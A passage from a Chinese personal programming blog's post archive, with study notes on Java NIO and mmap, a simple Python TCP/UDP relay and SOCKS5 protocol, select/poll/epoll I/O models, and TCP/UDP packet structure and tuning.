和 Socket Channel，其中 socket channel 又分为三大类，一个是用于监听端口的ServerSocketChannel，第二类是用于TCP通信的SocketChannel，第三类是用于UDP通信的DatagramChannel。channel 最主要的作用还是用于非阻塞式读写。可以使用Channel结合ByteBuffer进行读写。一个简单的client server echo程序可以这样写 // server public class WebServer { public static void main(String args[]) { try { ServerSocketChannel ssc = ServerSocketChannel.open(); ssc.socket().bind(new InetSocketAddress(&quot;127.0.0.1&quot;, 8000)); SocketChannel socketChannel = ssc.accept(); ByteBuffer readBuffer = ByteBuffer.allocate(128); socketChannel.read(readBuffer); readBuffer.flip(); while (readBuffer.hasRemaining()) { System.out.println((char)readBuffer.get()); } socketChannel.close(); ssc.close(); } catch (IOException e) { e.printStackTrace(); } } } // client public class WebClient { public static void main(String[] args) { SocketChannel socketChannel = null; try { socketChannel = SocketChannel.open(); socketChannel.connect(new InetSocketAddress(&quot;127.0.0.1&quot;, 8000)); ByteBuffer writeBuffer = ByteBuffer.allocate(128); writeBuffer.put(&quot;hello world&quot;.getBytes()); writeBuffer.flip(); socketChannel.write(writeBuffer); socketChannel.close(); } catch (IOException e) { } } } MMAP(memory mapped file)将文件映射到内存空间的操作，懒得看原理的话，背下这段话就够了 常规文件操作需要从磁盘到页缓存再到用户主存的两次数据拷贝。而mmap操控文件，只需要从磁盘到用户主存的一次数据拷贝过程。说白了，mmap的关键点是实现了用户空间和内核空间的数据直接交互而省去了空间不同数据不通的繁琐过程。因此mmap效率更高 实际上,mmap系统调用并不是完全为了用于共享内存而设计的.它本身提供了不同于一般对普通文件的访问方式,是进程可以像读写内存一样对普通文件操作.而Posix或System V的共享内存则是纯粹用于共享内存的,当然mmap实现共享内存也是主要应用之一.mmap函数是unix/linux下的系统调用，mmap系统调用并不是完全为了用于共享内存而设计的,mmap实现共享内存也是其主要作用之一，事实上可以实现两个java进程之间的通信。 A进程 public class Main { public static void main(String args[]){ RandomAccessFile f = null; try { f = new RandomAccessFile(&quot;C:/hinusDocs/hello.txt&quot;, &quot;rw&quot;); FileChannel fc = f.getChannel(); MappedByteBuffer buf = fc.map(FileChannel.MapMode.READ_WRITE, 0, 20); buf.put(&quot;how are you?&quot;.getBytes()); Thread.sleep(10000); fc.close(); f.close(); } catch (Exception e) { e.printStackTrace(); } } } B进程 public class MapMemoryBuffer { public static void main(String[] args) throws Exception { RandomAccessFile f = new RandomAccessFile(&quot;C:/hinusDocs/hello.txt&quot;, &quot;rw&quot;); FileChannel fc = f.getChannel(); MappedByteBuffer buf = fc.map(FileChannel.MapMode.READ_WRITE, 0, fc.size()); while (buf.hasRemaining()) { System.out.print((char)buf.get()); } System.out.println(); } } 很多java方法本质上就是jni进行了系统调用。在sun.nio.ch.FileChannelImpl里有map的具体实现： try { // If no exception was thrown from map0, the address is valid addr = map0(imode, mapPosition, mapSize); } catch (OutOfMemoryError x) { private native long map0(int prot, long position, long length) 比如Java的这个map0函数，具体的实现在solaris/native/sun/nio/ch/FileChannelImpl.c这个文件里 JNIEXPORT jlong JNICALL Java_sun_nio_ch_FileChannelImpl_map0(JNIEnv *env, jobject this, jint prot, jlong off, jlong len) { void *mapAddress = 0; jobject fdo = (*env)-&gt;GetObjectField(env, this, chan_fd); jint fd = fdval(env, fdo); int protections = 0; int flags = 0; if (prot == sun_nio_ch_FileChannelImpl_MAP_RO) { protections = PROT_READ; flags = MAP_SHARED; } else if (prot == sun_nio_ch_FileChannelImpl_MAP_RW) { protections = PROT_WRITE | PROT_READ; flags = MAP_SHARED; } else if (prot == sun_nio_ch_FileChannelImpl_MAP_PV) { protections = PROT_WRITE | PROT_READ; flags = MAP_PRIVATE; } mapAddress = mmap64( 0, /* Let OS decide location */ len, /* Number of bytes to map */ protections, /* File permissions */ flags, /* Changes are shared */ fd, /* File descriptor of mapped file */ off); /* Offset into file */ if (mapAddress == MAP_FAILED) { if (errno == ENOMEM) { JNU_ThrowOutOfMemoryError(env, &quot;Map failed&quot;); return IOS_THROWN; } return handle(env, -1, &quot;Map failed&quot;); } return ((jlong) (unsigned long) mapAddress); } 其实就是通过jni调用了c语言api. 总结netty的作者在演讲中提到java官方的nio并不特别好，所以，生产环境用的都是netty这种。 参考美团团队出的关于nio的解说这里面有一句原话摘抄下来： 线程的创建和销毁成本很高，在Linux这样的操作系统中，线程本质上就是一个进程。创建和销毁都是重量级的系统函数。像Java的线程栈，一般至少分配512K～1M的空间，","tags":[{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"tcp-proxy简单实现及socks协议相关","date":"2018-12-31T18:45:38.000Z","path":"2018/12/31/2018-12-31-tcp-proxy-and-socks-server-related/","text":"python实现简易的tcp-proxy server及socks代理学习笔记 首先是基本的流程本地起一个tcp代理，监听0.0.0.0的1090端口,接收到任何数据之后原封不动发送到远程服务器。接着本机或者局域网内其他机器使用telnet往这个1090端口发数据。这样的proxy其实也就是实质上的一个tcp跳板机。 先介绍一下telnet的使用教程在windows上telnet好像默认关闭了。在mac上： telnet 127.0.0.1 1090 // 这句话类似于连接到这个port，但是还没有发送数据。接下来可以发送数据 在mac上ctrl+]是进入命令模式，可以输入一些比较好玩的命令:比如help，比如quit。send ayt //原封不动发送are you there 这几个字符send ? //查看可以使用send发送哪些指令，其实就是发送字符telnet的输出按删除键是不会清除的，输入cls就可以了。 另外,telnet是明文发送的，ssh会加密一下Telnet data is sent in clear text. It’s certainly a good idea to use SSH to access network devices especially when going through a public network like Internet. As you are probably aware SSH would encrypt all data between the client/server and even if someone gets a hand on the data it’s of no use. 然后就是如何实现这个本地代理了 本地先绑定一个socket在1090端口 1090端口每次接收到一个新的sock连接，起一个新的线程，去处理和这个新的client的一次会话 在这个会话里面，同时启动两个线程（一个从local client读数据，然后发给remote server；另一个从remote server读取数据，发给local client） 这里面每个会话的remote server都是一个一个固定的ip:port，但是local client的port是变来变去的 看看第三步，其实就是一个往返，所以顺序掉个头就行了，而且彼此互相不干扰（在只有一个会话的时候，remote.recv可以认为就是对当前client.send的回应）这个往返用代码描述一下就是: def sock_proxy(remote, local): local_request = local.recv(4096) ## 如果local和remote对调一下，这里就是从remote读数据 ## .... remote.sendAll(local_request.encode()) ## 这里就是 GET / HTTP1.1 ...这种字符串，如果local和remote对调一下，就是发数据给local client 省略了一些try except和socket.close的代码。上面写了4096，是说最大接收数据量是4096字节，不是一次读取4096个字节的意思。下面是python中这几个函数的定义 s.recv(bufsize[,flag]) 接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。 s.send(string[,flag]) 发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。 s.sendall(string[,flag]) 完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。 具体用什么语言来实现，其实都没什么大的差别了。用Python好在跨平台，代码量少。 使用方式 python tcp_proxy -l 0.0.0.0:1090 -r zhihu.com:80 -v //代码是在别人的基础上改的，直接用别人的argument parser了 意思就是在本地监听1090端口，任何发到本地1090端口的包都会被发到zhihu.com这个host的80端口(测试了下，知乎返回的response是正常的) 本地另外起一个telnet telnet 127.0.0.1 1090GET / HTTP 1.1 \\r\\n\\r\\n //事实上在telnet里面输入换行符有点困难，因为按下回车的时候会顺带在后面加上换行符…然后这里就会出现远程服务器的回应。 因为直接从client的报文中提取请求信息其实挺没意思的，所以暂时在python代码里写死了发送给远程的content 发现curl原来可以直接往任意host:port发送http格式的请求 curl localhost:1090 在proxy一侧收到的请求报文： GET / HTTP/1.1 Host: localhost:1090 User-Agent: curl/7.54.0 Accept: */* 最后是有俩换行的 用nc(netcat)也能往1090端口发数据 nc 127.0.0.1 1090GET / HTTP 1.1 \\r\\n\\r\\n 这个可以直接打换行，更方便 接下来就是看如何处理多个client的session(sock5协议实现)以上实现的只是一个tcp proxy，就是完全不检查通信内容的代理，是直接站在tcp层的。现实中还有http proxy,sock proxy，彼此之间有一些差别。 多个client或者一个client的多个port同时走这个代理去访问远程时，代理服务器不可避免要记录下client和sever之间的连线，适当的还要在packet里面塞一些标记。业内成熟的方案当然是sock5协议,对应的标准是RFC 1928和RFC 1929。 从wiki上来看sock5是在sock4版本的基础上加了鉴定、IPv6、UDP支持。 SOCKS工作在比HTTP代理更低的层次：SOCKS使用握手协议来通知代理软件其客户端试图进行的连接SOCKS，然后尽可能透明地进行操作，而常规代理可能会解释和重写报头（例如，使用另一种底层协议，例如FTP；然而，HTTP代理只是将HTTP请求转发到所需的HTTP服务器）。虽然HTTP代理有不同的使用模式，CONNECT方法允许转发TCP连接；然而，SOCKS代理还可以转发UDP流量和反向代理，而HTTP代理不能。HTTP代理通常更了解HTTP协议，执行更高层次的过滤（虽然通常只用于GET和POST方法，而不用于CONNECT方法）。 sock5_protocol协议包括:协议协商客户端首先向SOCKS服务器自己的协议版本号，以及支持的认证方法。SOCKS服务器向客户端返回协议版本号以及选定的认证方法。 认证客户端根据服务器端选定的方法进行认证，如果选定的方法是02,则根据RFC 1929定义的方法进行认证。RFC 1929定义的密码是明文传输，安全性较差。 请求一旦指定认证方法的协商过程完成, 客户端发送详细的请求信息。经常使用 SOCKS 代理服务器的同志们会发现一种现象，即使 SOCKS 代理服务器设置正确，某些网站仍然无法访问,一般来说就是DNS污染造成的。SOCKS 5是通过将域名直接提交给 SOCKS 服务器来进行远端 DNS 解析的，即 Address Type 0x03。 DNS 服务是 Internet 的基础服务，要求 DNS 解析应当尽量地快，所以浏览器默认不会使用远端 DNS 解析。在Chrome的SwitchySharp 和Firefox里面的FoxyProxy可以支持远端DNS解析，可以避开DNS污染问题。 sock5协议其实在命令行里就能用上: curl –sock5 127.0.0.1:1080 http://www.google.com 整体的流程: 客户端向服务器发送协议版本号及支持认证方式(在proxy server这边会收到几个字节的bind请求05 01 00 xxxx)服务器回应版本号及选定认证方式客户端发送Connect请求服务器对Connect的响应客户端发送被代理的数据服务器响应被代理的数据 所以最终实现的效果是实现使用代理访问知乎因为走的是明文，这样的代理只是具有学习的性质。更多的需要参考shadowsocks的实现(tcp proxy,支持udp)。另外，业内比较出名的tcp proxy有nginx，enovy以及golang tcp proxy的实现。 udp proxy的实现非常短的一个脚本 #!/usr/bin/env python # Super simple script that listens to a local UDP port and relays all packets to an arbitrary remote host. # Packets that the host sends back will also be relayed to the local UDP client. # Works with Python 2 and 3 import sys, socket def fail(reason): sys.stderr.write(reason + &#39;\\n&#39;) sys.exit(1) if len(sys.argv) != 2 or len(sys.argv[1].split(&#39;:&#39;)) != 3: fail(&#39;Usage: udp-relay.py localPort:remoteHost:remotePort&#39;) localPort, remoteHost, remotePort = sys.argv[1].split(&#39;:&#39;) try: localPort = int(localPort) except: fail(&#39;Invalid port number: &#39; + str(localPort)) try: remotePort = int(remotePort) except: fail(&#39;Invalid port number: &#39; + str(remotePort)) try: s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.bind((&#39;&#39;, localPort)) except: fail(&#39;Failed to bind on port &#39; + str(localPort)) knownClient = None knownServer = (remoteHost, remotePort) sys.stderr.write(&#39;All set.\\n&#39;) while True: data, addr = s.recvfrom(32768) if knownClient is None: knownClient = addr if addr == knownClient: s.sendto(data, knownServer) else: s.sendto(data, knownClient) raw socket(原始套接字)优化server端监听在一个端口，client端发送数据的端口变来变去。数据量大的时候单线程阻塞式的server还是会有性能问题。python中可以使用selectors模块，在server端，每次socket.accept()之后，就register一个fileno for read and write event。参考udpRelayServer每次selector.select(这个函数是blocking的)，从端口上来看，client这边可以开多个port发数据给proxy， proxy这边只用一个port接受，对外部网络世界多个ip，开多个port。所以proxy内部应该维护一个external port &lt;======&gt; client port 的映射。开始select之后，首先是select出来一个readable的client socket(port) ，读取信息，存储到一个{ clientport , [clientmessageOutList] } 的字典里。 然后根据clientmessage中暗示的remote ip和port去register一个socket， register的时候是可以带上一些自定义数据的，这里放上clientport. 当这个register的回调开始时，如果是可写，那么把刚才字典里的信息拿出来，del掉。 如果是可读，那么说明发出去的东西有回信了，这时候去自定义数据里面的port，存到一个{clientport, [messageToBeDelivedBackList] } 的字典里。在select本地port的时候，如果扫到一个writabel的client socket port，就根据这个port num 去字典里获取messageToBeDelivedBack，发送回去。到此结束一个流程。任何时间段，proxy这边维持了两个字典，一头是面向client的，port =&gt; [要发送的msg1,要发送的msg2,…] , 一头是面向多个remote ip port组合的的。存储了 clientport =&gt; [要回复给client的msg1 ,要回复给client的msg2] .面向client只需要做一个selector操作，面向outside需要做多个selector操作（一个外部网站一般一个就够了）。不停的轮询。但实际上只需要一个selector就行了。 try: while True: events = sel.select(timeout=1) if events: for key, mask in events: service_connection(key, mask) ## key.fileobj是socket, key,data是register的时候自定义的数据 ss的tcp包结构主动探测方法协议与结构 参考python小工具：tcp proxy和tcp hubWriting a simple SOCKS server in PythonSOCKS 5协议简析","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"bytecode基本解读","date":"2018-12-12T11:11:02.000Z","path":"2018/12/12/2018-12-12-sinking-your-teeth-into-ByteCode/","text":"python中可以使用diss module 轻易的查看byte code。那么在java中呢 interpreting the talk fromSinking Your Teeth Into Bytecode java 有一个关键字叫做goto，在java代码中好像不能用，但是其实在生成的bytecode里面有goto关键字(c语言也有) javap -c someclas 从反编译角度来看string常量池的问题 参考JVM bytecode engineering 101JVM Bytecode for Dummies (and the Rest of Us Too)实例分析JAVA CLASS的文件结构从字节码层面看“HelloWorld”","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"select、poll、epoll学习笔记","date":"2018-12-06T08:38:54.000Z","path":"2018/12/06/2018-12-06-select-poll-epoll/","text":"select，poll，epoll都是IO多路复用的机制。I/O多路复用就通过一种机制，可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作。但select，poll，epoll本质上都是同步I/O，因为他们都需要在读写事件就绪后自己负责进行读写，也就是说这个读写过程是阻塞的，而异步I/O则无需自己负责进行读写，异步I/O的实现会负责把数据从内核拷贝到用户空间。 用户态到内核态的内存copy的开销 mac上叫做Kqueueepoll或者Kqueue的原理是什么 在看socket programming in python这篇文章时发现有selector这样的操作。其实和c语言的做法很相似。 Windows IOCP与Linux的epoll机制对比系统I/O模型 可分为三类：第一种： 阻塞型(blocking model)，应用进程发起connect请求，进入系统内核方法调用。内核负责发送SYN,等待ACK,等到ACK、SYNC到达以后，发送ACK，连接完成，return用户态的connect调用。以上过程中，应用层一直阻塞。 第二种： 非阻塞同步型(non-blocking model): “wait until any socket is available to read or write from/to buffer, then call non blocking socket function which returns immediately.”可以通过设置SOCK_NONBLOCK标记创建非阻塞的socket fd，或者用fcntl也是一样的。比方说c语言在linux环境下可以这么写。 // client side int socketfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0); // server side - see man page for accept4 under linux int socketfd = accept4( ... , SOCK_NONBLOCK); 对非阻塞fd调用系统接口时，不需要等待事件发生而立即返回，事件没有发生，接口返回-1，此时需要通过errno的值来区分是否出错，有过网络编程的经验的应该都了解这点。不同的接口，立即返回时的errno值不尽相同，如，recv、send、accept errno通常被设置为EAGIN 或者EWOULDBLOCK，connect 则为EINPRO- GRESS 。就是说，客户端程序会不停地去尝试读取数据，但是不会阻塞在那个读方法里，如果读的时候，没有读到内容，也会立即返回。这就允许我们在客户端里，读到不数据的时候可以搞点其他的事情了。 第三种： 非阻塞异步型(asynchronous aka. overlapping model): “call a socket function which returns immediately, then wait for its completion, then access the result data object”IO多路复用，I/O复用(I/O multiplexing). IO多路复用是nio的核心和关键，也是实现高性能服务器的关键。应用进程通过调用epoll_wait阻塞等待可读事件，等可读事件触发时，系统会回调注册的函数。 另外还有信号，async io IOCP基于非阻塞异步模型，而epoll基于非阻塞同步模型。 Windows IOCP vs Linux EPOLL Performance ComparisonIO多路复用之epoll总结Linux IO模式及 select、poll、epoll详解epoll浅析以及nio中的Selector大话 Select、Poll、EpollThere is no Windows equivalent to epoll/kqueue , but there is Overlapped IO 简单说就是windows在这方面设计的更优秀，只是开发者并未买账Coroutines, Async/Await, Asyncio and the Pulsar Library node, go goroutine, nginx, gui libraries ,java nio等都以各种形式采用了或实现了自己的event loop IO 多路复用 — SELECT 和 POLL linux kernel aio是另一个内核提供的异步框架，但是不如epoll成熟","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"tbd","slug":"tbd","permalink":"https://haldir65.github.io/tags/tbd/"}]},{"title":"tcp和udp包结构分析","date":"2018-12-03T13:42:25.000Z","path":"2018/12/03/2018-12-03-packet-structure-of-tcp-and-udp/","text":"本文只针对ipv4网络进行分析 多数内容来自TCP 报文结构同一台机器上的两个进程，可以通过管道，共享内存，信号量，消息队列等方式进行通信。通信的一个基本前提是每个进程都有唯一的标识，在同一台机器上，使用pid就可以了。两台不同的计算机之间通信，可以使用ip地址 + 协议 +协议端口号 来标识网络中的唯一进程。 TCPtcp用16位端口号来标识一个端口，也就是两个bytes(65536就这么来的)。 以下图片盗自chinaunix一篇讲解raw socket的文章 这是IP packet 这是TCP header 这是IP header 这是mac header 什么是报文？例如一个 100kb 的 HTML 文档需要传送到另外一台计算机，并不会整个文档直接传送过去，可能会切割成几个部分，比如四个分别为 25kb 的数据段。而每个数据段再加上一个 TCP 首部，就组成了 TCP 报文。一共四个 TCP 报文，发送到另外一个端。另外一端收到数据包，然后再剔除 TCP 首部，组装起来。等到四个数据包都收到了，就能还原出来一个完整的 HTML 文档了。在 OSI 的七层协议中，第二层（数据链路层）的数据叫「Frame」，第三层（网络层）上的数据叫「Packet」，第四层（传输层）的数据叫「Segment」。TCP 报文 (Segment)，包括首部和数据部分。 TCP 报文段首部的前20个字节是固定的，后面有 4N 字节是根据需要而增加的。TCP 的首部包括以下内容： 源端口 source port 目的端口 destination port 序号 sequence number 确认号 acknowledgment number 数据偏移 offset 保留 reserved 标志位 tcp flags 窗口大小 window size 检验和 checksum 紧急指针 urgent pointer 选项 tcp options 连接建立过程TCP 连接的建立采用客户服务器方式，主动发起连接建立的一方叫客户端（Client），被动等待连接建立的一方叫服务器（Server）。最初的时候，两端都处于 CLOSED 的状态，然后服务器打开了 TCP 服务，进入 LISTEN 状态，监听特定端口，等待客户端的 TCP 请求。第一次握手： 客户端主动打开连接，发送 TCP 报文，进行第一次握手，然后进入 SYN_SEND 状态，等待服务器发回确认报文。这时首部的同步位 SYN = 1，同时初始化一个序号 Sequence Number = J。TCP 规定，SYN 报文段不能携带数据，但会消耗一个序号。第二次握手： 服务器收到了 SYN 报文，如果同意建立连接，则向客户端发送一个确认报文，然后服务器进入 SYN_RCVD 状态。这时首部的 SYN = 1，ACK = 1，而确认号 Acknowledgement Number = J + 1，同时也为自己初始化一个序号 Sequence Number = K。这个报文同样不携带数据。第三次握手：客户端收到了服务器发过来的确认报文，还要向服务器给出确认，然后进入 ESTABLISHED 状态。这时首部的 SYN 不再置为 1，而 ACK = 1，确认号 Acknowledgement Number = K + 1，序号 Sequence Number = J + 1。第三次握手，一般会携带真正需要传输的数据，当服务器收到该数据报文的时候，就会同样进入 ESTABLISHED 状态。 此时，TCP 连接已经建立。对于建立连接的三次握手，主要目的是初始化序号 Sequence Number，并且通信的双方都需要告知对方自己的初始化序号，所以这个过程也叫 SYN。这个序号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输问题而乱序，因为TCP 会用这个序号来拼接数据。 TCP Flood 攻击知道了 TCP 建立一个连接，需要进行三次握手。但如果你开始思考「三次握手的必要性」的时候，就会知道，其实网络是很复杂的，一个信息在途中丢失的可能性是有的。如果数据丢失了，那么，就需要重新发送，这时候就要知道数据是否真的送达了。这就是三次握手的必要性。但是再向深一层思考，你给我发信息，我收到了，我回复，因为我是君子。如果是小人，你给我发信息，我就算收到了，我也不回复，你就一直等我着我的回复。那么很多小人都这样做，你就要一直记住你在等待着小人1号、小人2号、小人3号……直到你的脑容量爆棚，烧坏脑袋。黑客就是利用这样的设计缺陷，实施 TCP Flood 攻击，属于 DDOS 攻击的一种。 TCP进阶 四次挥手，释放连接TCP 有一个特别的概念叫做半关闭，这个概念是说，TCP 的连接是全双工（可以同时发送和接收）的连接，因此在关闭连接的时候，必须关闭传送和接收两个方向上的连接。客户端给服务器发送一个携带 FIN 的 TCP 结束报文段，然后服务器返回给客户端一个 确认报文段，同时发送一个 结束报文段，当客户端回复一个 确认报文段 之后，连接就结束了。释放连接过程在结束之前，通信双方都是处于 ESTABLISHED 状态，然后其中一方主动断开连接。下面假如客户端先主动断开连接。第一次挥手：客户端向服务器发送结束报文段，然后进入 FIN_WAIT_1 状态。此报文段 FIN = 1， Sequence Number = M。第二次挥手：服务端收到客户端的结束报文段，然后发送确认报文段，进入 CLOSE_WAIT 状态(通常来说，一个 CLOSE_WAIT 会维持至少 2 个小时的时间)。此报文段 ACK = 1， Sequence Number = M + 1。客户端收到该报文，会进入 FIN_WAIT_2 状态。第三次挥手：同时服务端向客户端发送结束报文段，然后进入 LAST_ACK 状态。此报文段 FIN = 1，Sequence Number = N。第四次挥手：客户端收到服务端的结束报文段，然后发送确认报文段，进入 TIME_WAIT 状态，经过 2MSL 之后，自动进入 CLOSED 状态。此报文段 ACK = 1, Sequence Number = N + 1。服务端收到该报文之后，进入 CLOSED 状态。关于 TIME_WAIT 过渡到 CLOSED 状态说明：从 TIME_WAIT 进入 CLOSED 需要经过 2MSL，其中 MSL 就叫做 最长报文段寿命（Maxinum Segment Lifetime），根据 RFC 793 建议该值这是为 2 分钟，也就是说需要经过 4 分钟，才进入 CLOSED 状态。 这里还只是tcp层面，如果加上tls初始化握手，这个速度会更慢一些下面从QUIC 在微博中的落地思考文中摘抄一部分批判tcp TCP 协议在建立连接时，需要经历较为漫长的三次握手行为，而在关闭时，也有稍显冗余的 4 次摆手。而 HTTPS 初始连接需要至少 2 个 RTT 交互（添加了握手缓存就会变成了 1-RTT，这里指的是 TLS 1.2），外加 TCP 自身握手流程，最少需要 3 次 RTT 往返，才能够完整建立连接。而 QUIC 协议层面界定了 1-2 个 RTT 握手流程，再次连接为 0-RTT 握手优化流程（但需要添加握手缓存） 关于tcp read/write buffer，shadowsocks的参数优化提到了一些东西 # max open files fs.file-max = 1024000 # max read buffer net.core.rmem_max = 67108864 # max write buffer net.core.wmem_max = 67108864 # default read buffer net.core.rmem_default = 65536 # default write buffer net.core.wmem_default = 65536 # max processor input queue net.core.netdev_max_backlog = 4096 # max backlog net.core.somaxconn = 4096 # resist SYN flood attacks net.ipv4.tcp_syncookies = 1 # reuse timewait sockets when safe net.ipv4.tcp_tw_reuse = 1 # turn off fast timewait sockets recycling net.ipv4.tcp_tw_recycle = 0 # short FIN timeout net.ipv4.tcp_fin_timeout = 30 # short keepalive time net.ipv4.tcp_keepalive_time = 1200 # outbound port range net.ipv4.ip_local_port_range = 10000 65000 # max SYN backlog net.ipv4.tcp_max_syn_backlog = 4096 # max timewait sockets held by system simultaneously net.ipv4.tcp_max_tw_buckets = 5000 # TCP receive buffer net.ipv4.tcp_rmem = 4096 87380 67108864 # TCP write buffer net.ipv4.tcp_wmem = 4096 65536 67108864 # turn on path MTU discovery net.ipv4.tcp_mtu_probing = 1 # for high-latency network net.ipv4.tcp_congestion_control = hybla # forward ipv4 net.ipv4.ip_forward = 1 内核文档对于这些参数的定义注意，这些参数修改了会影响所有的进程，修改还是慎重一些 tcp buffer关键字： tcp read buffer and write buffer这里要分congestion window（发送方的window，对应congestion control）和receive window(接收方的window，对应flow control)receive window Your Network Interface Card (NIC) is performing all of the necessary tasks of collecting packets and waiting for your OS to read them. Ultimately, when you do a stream read you’re pulling from the memory that your OS has reserved and constantly stores the incoming information copy into.To answer your question, yes. You are definitely doing a copy. A copy of a copy, the bits are read into a buffer within your NIC, your OS puts them somewhere, and you copy them when you do a stream read. 用wireshark抓包的话，在tcp header里面有个”window size value”，比方说这个数是2000，也就是发来这个包的一方告诉当前接受方，你下一次最多再发2000byte的数据过来，再多就装不下了。如果接收方处理速度跟不上，buffer慢慢填满，就会在ack包里调低window size，告诉对方发慢一点。client处理速度够快的时候是这样的 如果不够快的话,这时候就是client在ack包里告诉server自己跟不上了 TCP Window Scaling注意，window size是在ack包里的,另外,tcp header里面为这个window size准备的空间是2 bytes（65536 bytes,所以一个包最大也就65K?）。这样对于那些大带宽高延迟的连接来说是不利的。事实当然没这么简单，RFC 1323 enable the TCP receive window to be increased exponentially(指数增长)。这个功能是在握手的时候互相商定了一个增长的倍数(在tcp握手的header里面有一个window size scaling factor,比如下图这样的，一次乘以4) In the image above, the sender of this packet is advertising a TCP Window of 63,792 bytes and is using a scaling factor of four. This means that that the true window size is 63,792 x 4 (255,168 bytes). Using scaling windows allows endpoints to advertise a window size of over 1GB. To use window scaling, both sides of the connection must advertise this capability in the handshake process. If one side or the other cannot support scaling, then neither will use this function. The scale factor, or multiplier, will only be sent in the SYN packets during the handshake and will be used for the life of the connection. This is one reason why it is so important to capture the handshake process when performing TCP analysis. 就是说4这个数只会出现在握手的syn包中，并且只有在双方都能支持scaling的前提下才会用，而且这个4将会在这条连接的生命周期中一直是这个数，所以要分析的话，逮这个syn包去抓。 TCP Zero window意思就是说，这个window size变成0了。通常不会出现这种情况，一般是接收方的进程出问题了，这时候server会等着，随着client的应用层开始处理数据，client会慢慢发TCP Keep-Alive包，带上新的window size，告诉server说，自己正在处理数据，快了快了。 The throughput of a communication is limited by two windows: the congestion window and the receive window. The congestion window tries not to exceed the capacity of the network (congestion control); the receive window tries not to exceed the capacity of the receiver to process data (flow control). The receiver may be overwhelmed by data if for example it is very busy (such as a Web server). Each TCP segment contains the current value of the receive window. If, for example, a sender receives an ack which acknowledges byte 4000 and specifies a receive window of 10000 (bytes), the sender will not send packets after byte 14000, even if the congestion window allows it.总的来说，tcp传输的速度是由congestion window and the receive window控制的，前者控制发送方的发送速度，后者限制接收方的接收速度。 可靠性交付的实现到这里也就清楚了滑动窗口(sliding window)超时重传流量控制 (flow control)拥塞控制（congestion control） 一个tcp,udp或者ip包最大多大，最小多大最小我们知道传送TCP数据包的時候，TCP header 占 20 bytes， IPv4 header 占 20 bytes，所以最小40byte。那么最大呢TCP、UDP数据包大小的限制应用层udp最大1500-20-8 = 1472 字节(多了会被分片重组，万一分片丢失导致重组失败，就会被丢包)，1500是硬件决定的,20是ip头，8是udp的头结论UDP 包的大小就应该是 1500 - IP头(20) - UDP头(8) = 1472(Bytes)TCP 包的大小就应该是 1500 - IP头(20) - TCP头(20) = 1460 (Bytes)UDP数据报的长度是指包括报头和数据部分在内的总字节数，其中报头长度固定，数据部分可变。数据报的最大长度根据操作环境的不同而各异。从理论上说，包含报头在内的数据报的最大长度为65535字节(64K)。用UDP协议发送时，用sendto函数最大能发送数据的长度为：65535- IP头(20) - UDP头(8)＝65507字节。用sendto函数发送数据时，如果发送数据长度大于该值，则函数会返回错误。MTU 最大传输单元（英语：Maximum Transmission Unit，缩写MTU）是指一种通信协议的某一层上面所能通过的最大数据包大小（以字节为单位），怎么看 ping -l 1472 -f www.baidu.com ##根据提示去调小这个数就是了，一般1350以上是有的 从csdn搞来的图传输层：对于UDP协议来说，整个包的最大长度为65535，其中包头长度是65535-20=65515；对于TCP协议来说，整个包的最大长度是由最大传输大小（MSS，Maxitum Segment Size）决定，MSS就是TCP数据包每次能够传输的最大数据分段。为了达到最佳的传输效能TCP协议在建立连接的时候通常要协商双方的MSS值，这个值TCP协议在实现的时候往往用MTU值代替（需要减去IP数据包包头的大小20Bytes和TCP数据段的包头20Bytes）所以往往MSS为1460。通讯双方会根据双方提供的MSS值得最小值确定为这次连接的最大MSS值。IP层：对于IP协议来说，IP包的大小由MTU决定（IP数据包长度就是MTU-28（包头长度）。 MTU值越大，封包就越大，理论上可增加传送速率，但MTU值又不能设得太大，因为封包太大，传送时出现错误的机会大增。一般默认的设置，PPPoE连接的最高MTU值是1492, 而以太网（Ethernet）的最高MTU值则是1500,而在Internet上，默认的MTU大小是576字节 协议数据单元(Protocol Data Unit, PDU)应用层数据在传输过程中沿着协议栈传递，每一层协议都会往其中添加信息，这就是封装的过程。在封装过程中，每一个阶段的PDU都有不同的名字来反映它的功能。 PDU按照TCP/IP协议的命名规范：数据（Data）：应用层PDU的常用术语分段（Segment）：传输层PDU帧（Frame）：网络层PDU比特（Bits）：在介质上物理传输数据所使用的PDU。 最终发出去的数据包应该是Data link Ethernet Frame Header(Destination mac address + Source mac address) +Network Layer IP Packet Header(Source network:host + Destination network: host) +Transport Header(port) +data https版本的握手，证书校验，change cipher出处证书验证完毕之后，觉得这个服务端是可信的，于是客户端计算产生随机数字Pre-master，发送Client Key Exchange，用证书中的公钥加密，再发送给服务器，服务器可以通过私钥解密出来。接下来，无论是客户端还是服务器，都有了三个随机数，分别是：自己的、对端的，以及刚生成的Pre-Master随机数。通过这三个随机数，可以在客户端和服务器产生相同的对称密钥。有了对称密钥，客户端就可以说：“Change Cipher Spec，咱们以后都采用协商的通信密钥和加密算法进行加密通信了。”然后客户端发送一个Encrypted Handshake Message，将已经商定好的参数等，采用协商密钥进行加密，发送给服务器用于数据与握手验证。同样，服务器也可以发送Change Cipher Spec，说：“没问题，咱们以后都采用协商的通信密钥和加密算法进行加密通信了”，并且也发送Encrypted Handshake Message的消息试试。当双方握手结束之后，就可以通过对称密钥进行加密传输了 下面这段摘自微信公众号”刘超的通俗云计算” 